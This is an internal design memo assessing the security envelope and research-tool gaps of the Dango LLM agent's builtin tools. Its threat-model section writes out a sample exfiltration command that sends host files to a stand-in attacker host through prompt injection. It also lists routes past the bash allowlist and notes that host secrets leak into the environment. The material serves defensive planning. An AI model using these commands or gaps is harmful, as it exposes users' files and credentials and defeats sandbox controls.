# Builtin Tools — Security and Research Coverage Memo

Last updated: 2026-05-19.
Status: Assessment only. No implementation is committed by this document.
Related: `docs/builtin-tools-restructure-plan.md`,
`docs/deferred-refactor-tracker-memo.md` § "PR C - Builtin Tools
Restructure".

This memo records, as of the PR C-6 closeout, two things that fell out
of scope of the restructure but matter before Dango formally adopts
research-class or autonomous-experiment skills:

1. The realistic security envelope of the current builtin tool set.
2. The coverage gap between today's tools and the workflows a research
   or autonomous-experiment skill typically needs.

It is written so a future PR proposing research-skill support can pick
it up without rereading this conversation. Nothing here proposes new
tools to ship today; each candidate is a hook for a separately scoped
PR.

## 0. Triage decisions (2026-05-19)

After review, the contents below are sorted into three tracks. Read this
section first; it controls where each later subsection is actionable.

- **Security envelope (§ 2) — deferred to a dedicated post-feature
  hardening phase.** The risks named there are real, but security
  hardening should follow once the core feature surface is complete and
  internal end-to-end testing has stabilized. Until then, use the
  default-vs-`BuiltinExtras` split as the only routine knob: ship
  general, low-risk capabilities in the default set, route narrower or
  higher-risk capabilities through `BuiltinExtras` so the skill author
  opts in explicitly. Do not attempt egress allowlists, env scrubbing,
  or resource caps until the dedicated phase begins.
- **Research / autonomous-experiment capabilities (§ 3.1–§ 3.3) —
  delivered as external dango-official skills via the upcoming `cmd`
  selection cycle, not as Go builtins.** Web search, paper fetch, PDF
  and HTML extraction, dataset acquisition, tabular preview, notebook
  execution, experiment lifecycle, and cluster submission are all
  Python-heavy or external-runtime-heavy. They are a poor fit for the
  Go-resident builtin set and a good fit for skills shipped alongside
  dango that the user enables at startup. Track these under the `cmd`
  program plan, not here. They are not addressed by Track D below.
- **Go-resident builtin work that remains in scope of this memo
  (§ 3.4–§ 3.5).** Version-control inspection and structured-artifact
  handling stay in Go because they are OS-resident, workspace-bounded,
  and free of Python dependencies. They are scheduled under
  `docs/builtin-tools-vcs-and-artifacts-plan.md` (Track D), with one
  independently verifiable PR per capability.

## 1. Inventory snapshot

Default (always on): `bash`, `read_file`, `write_file`, `edit_file`,
`delete_file`, `move_file`, `grep`, `pipeline_search_replace`,
`file_excerpt`.

Opt-in via `BuiltinExtras`: `list_dir`, `pwd`.

Bash allowlist (`internal/llm/internal/builtin/allowlist.go`,
`defaultAllowlist`) covers ~70 binaries spanning read-only text tools,
archive tools, language toolchains, package managers, and the two
network fetchers `curl` and `wget`. Destructive tools (`rm`, `mv`,
`dd`, `sudo`) are intentionally absent; filesystem mutation is funnelled
through the Go tools.

## 2. Security envelope

**Triage:** Deferred (see § 0). The subsections below are kept as a
reference inventory of what is enforced versus what is intentionally
not enforced today. Do not act on the mitigation list in § 2.3 until
the dedicated security-hardening phase begins. The only security-shaped
decision routine to keep doing in the meantime is choosing default vs
`BuiltinExtras` placement based on a capability's generality and risk.

### 2.1 What is actually enforced

- **Path containment for Go tools.** Every Go-implemented tool routes
  paths through `workspace.ResolvePath`, which rejects paths outside the
  temp playground, the skill source root, and any user-added accessible
  directory. Symlink escapes through existing prefixes are rejected by
  `resolvePathExistingPrefix`.
- **Bash redirection containment.** `checkRedirections` (PR C-1)
  statically rejects dynamic redirect targets and absolute targets
  outside the workspace. Heredocs and here-strings are accepted because
  they do not touch host paths.
- **Bash allowlist on simple-command heads.** `checkAllowlist` walks the
  parsed AST and rejects unknown command heads, including inside
  pipelines, subshells, and command substitutions.
- **Output and runtime bounds.** Bash output is capped at 16 KiB by
  default; `output_file` redirects large output into a workspace-bounded
  file. Default timeout is 60 s; `long_running: true` defers to parent
  context cancellation.

### 2.2 What is not enforced (known and accepted today)

- **Argument-level write targets.** `tee /etc/foo`, `cp src /etc/foo`,
  `dd of=/etc/foo`, `python -c "open('/etc/foo','w')..."`, and similar
  are not inspected. Bash and `system_instructions.md` already document
  this. Skills that need workspace containment must route writes through
  redirections or the Go file tools.
- **Allowlist is per-process-head, not per-effective-action.** Allowed
  Turing-complete heads (`python3`, `node`, `bash -c "..."`, `sh -c`,
  `make`, `xargs <cmd>`, `find ... -exec ...`, `awk 'BEGIN{system(...)}'`)
  can execute arbitrary code that the allowlist never inspects. The
  allowlist is a forcing function for tool selection, not a sandbox.
- **Network egress is unrestricted.** `curl` and `wget` are in the
  default allowlist with no URL allowlist or rate limit. Package
  managers (`pip`, `npm`, `pnpm`, `cargo`, `uv`, `conda`, `pixi`, …)
  pull and execute arbitrary code from package indexes on install.
- **Process environment is inherited.** Bash inherits the parent
  process's full environment, so any secrets exported to the host shell
  (API keys, SSH agent sockets, cloud credentials) are visible to the
  model. There is no env filtering or per-skill secret broker.
- **No resource caps beyond timeout.** No CPU, memory, file-descriptor,
  process-count, or disk-quota limits. Long-running bash defers to the
  parent context only.
- **No audit log dedicated to tool calls.** The stream-event log
  captures `llm.tool_call.started`, which is enough for trace analysis
  (see PR C-3), but it is not designed as a security audit trail.

### 2.3 Threat-model implications

The current envelope is appropriate for **trusted local developer use**:
a human is running the example, the workspace is disposable, and
network egress / package install is desirable. It is **not** appropriate
for:

- Untrusted task input where prompt injection could cause the model to
  exfiltrate host files via `curl --data-binary @/path http://attacker`.
- Multi-tenant or shared-host execution.
- Autonomous experiment loops that may run unattended for hours and
  accumulate state, install dependencies, and contact external services
  without human review of each step.

Mitigations to consider before that adoption (each its own PR):

- An optional egress allowlist on `curl`/`wget` (and the equivalent
  hooks in pip/npm/cargo wrappers).
- A `WithBashEnv(...)` filter that scrubs the inherited environment by
  default and lets skills opt into specific keys.
- Argument-level write-target inspection for the small set of allowed
  commands that take a write path (`tee`, `cp`, `dd`, redirected
  `awk`/`sed`).
- A "no network" config preset that drops `curl`/`wget` and package
  installers from the allowlist when the skill does not need them.
- Resource caps (RLIMIT_AS, RLIMIT_CPU, RLIMIT_NOFILE) on the bash
  child process.

## 3. Coverage gap for research / autonomous experiment skills

The PR C restructure tuned the default set for general code-and-data
work. Research and autonomous-experiment workflows pull in several
verticals that the current set covers only through ad-hoc bash. The
gaps below are grouped by workflow stage; each one is a candidate, not a
commitment.

**Triage by track.** § 3.1–§ 3.3 move to the **external-skill track**
delivered via the `cmd` program selection cycle, because they depend on
Python or other external runtimes and are a poor fit for Go-resident
builtins. § 3.4–§ 3.5 stay in the **Go builtin track** and are
scheduled under `docs/builtin-tools-vcs-and-artifacts-plan.md`. Each
subsection below repeats its track tag for clarity.

### 3.1 Source discovery and literature

**Track:** external skills via `cmd`. All four candidates below are
Python-heavy and depend on third-party libraries (HTTP clients, PDF
parsers, HTML normalizers, citation formatters). Defer to the `cmd`
development cycle; do not add Go builtins for these.

- **Web search.** No structured `web_search` tool. Skills that need to
  locate papers, datasets, or documentation can only `curl` known URLs.
  A `web_search` tool that returns ranked titles + snippets + URLs would
  remove a Turing-complete escape (`python3 -c "...requests..."`) from
  the hot path.
- **Authoritative paper fetch.** `arxiv_fetch` /
  `semantic_scholar_fetch` style wrappers that return metadata + PDF
  path inside the workspace. Currently done via bash + `curl` + manual
  HTML scraping.
- **HTML / PDF extraction.** `pdf_extract_text`, `pdf_extract_tables`,
  `html_to_markdown`. Done today via `python3 + pdfminer/pymupdf`, which
  forces every research skill to redeclare an extraction script.
- **Citation handling.** `citation_format` (BibTeX/CSL-JSON in, formatted
  string out). Low priority; mention only because every literature task
  re-implements it.

### 3.2 Dataset and environment management

**Track:** external skills via `cmd`. Pandas / pyarrow / nbconvert
ecosystems are the natural home. Defer to the `cmd` cycle.

- **Dataset fetch with caching.** `dataset_fetch` (URL or
  Kaggle/HuggingFace dataset id, returns path inside workspace, caches
  across runs in a user-added accessible dir). Replaces ad-hoc
  `curl | tar -xz` chains.
- **Tabular preview / schema sniff.** `table_preview` (CSV/Parquet/JSON
  Lines path → first N rows + inferred schema + null counts). Today
  this is bash + `python3 -c "import pandas..."` boilerplate that costs
  tokens on every research turn.
- **Notebook execution.** `notebook_run` (path + parameters →
  executed-notebook artifact path). `jupyter` is on the allowlist but
  the model has to remember the `nbconvert --execute` incantation each
  time.

### 3.3 Experiment lifecycle

**Track:** external skills via `cmd`, with one caveat. The Python and
cluster-runtime dependencies (mlflow / wandb / sbatch / kubectl) push
this to the external-skill track. The one item that may eventually
re-enter the Go builtin track is generic background-job control if it
becomes a recurring bash pain point under PR C-3-style trace evidence;
flag it then, not now.

- **Experiment logger.** `experiment_log` (write a structured row
  describing run config, metrics, artifact paths). Right now the
  pattern is hand-rolled JSONL files in `memo/` per skill.
- **Background job control.** Bash supports `long_running: true` but
  there is no listing/killing of running jobs and `kill`, `ps`,
  `pgrep`, `pkill`, `nohup`, `timeout` are not on the allowlist. For
  autonomous experiments that fork training jobs and need to abort on
  early-stopping signals, this is the biggest concrete gap.
- **Resource probe.** `system_probe` (available CPU, RAM, GPU
  visibility). Today via `nvidia-smi`/`free -h` which are not on the
  allowlist either. Useful for deciding batch sizes before launching a
  training run.
- **Cluster submission.** `slurm_submit` / `slurm_status`,
  `ssh_run`. Out of scope for the first research-skill PR but should
  be noted: today bash cannot reach `sbatch`/`squeue`/`ssh` because
  none are on the allowlist.

### 3.4 Version control and history

**Track:** Go builtin. Scheduled under
`docs/builtin-tools-vcs-and-artifacts-plan.md`.

- **Git.** Not on the default allowlist. Research skills that ingest
  existing repos (read commit history, diff between revisions, blame a
  line) currently cannot. Adding `git` to the allowlist is the simplest
  patch; a `git_log` / `git_diff` wrapper is the token-frugal version
  if traces justify it under the PR C-3 rule.

### 3.5 Structured artifact handling

**Track:** Go builtin. Scheduled under
`docs/builtin-tools-vcs-and-artifacts-plan.md`.

- **Artifact catalog.** A first-class read of the per-task
  `downstream/artifacts/` directory + the handoff front-matter
  `artifacts:` list, returning a typed summary instead of forcing the
  model to re-grep handoff YAML.
- **JSON/YAML schema preview.** `jq` and `yq` are on the allowlist, so
  this is reachable, but a `structured_preview` wrapper that returns
  top-level keys plus value-type counts is cheaper for autonomous
  loops than a fresh `jq` invocation each turn.

## 4. Suggested sequencing

Updated 2026-05-19 to reflect the § 0 triage.

1. **Go builtin Track D — VCS and artifact handling.** Land the PRs in
   `docs/builtin-tools-vcs-and-artifacts-plan.md` first. Each PR is
   small and self-contained, and the work does not block the security
   or external-skill tracks.
2. **External research-skill track via `cmd`.** Design the skill
   selection and packaging mechanism as part of the upcoming `cmd`
   program cycle. The § 3.1–§ 3.3 capabilities live there. Plan that
   track in its own document; do not stage Go builtins for it.
3. **Security-hardening phase.** Only after the core feature surface
   is complete and internal end-to-end testing has stabilized: revisit
   § 2's mitigations (egress allowlist, env scrubbing, argument-level
   write-target inspection, resource caps). Each mitigation should
   land in its own PR with explicit threat-model framing.

## 5. Out of scope of this memo

- No new tool is being added by PR C-6 or by this memo.
- No allowlist change is being made; the listed candidates are pointers,
  not decisions. Track D's plan file owns the actual VCS and artifact
  PR specs.
- No commitment to a specific research-skill design. That belongs with
  the `cmd` program cycle when external-skill selection is scoped.
- No security mitigation is being scheduled yet; that phase begins
  after feature complete and is tracked separately when it opens.
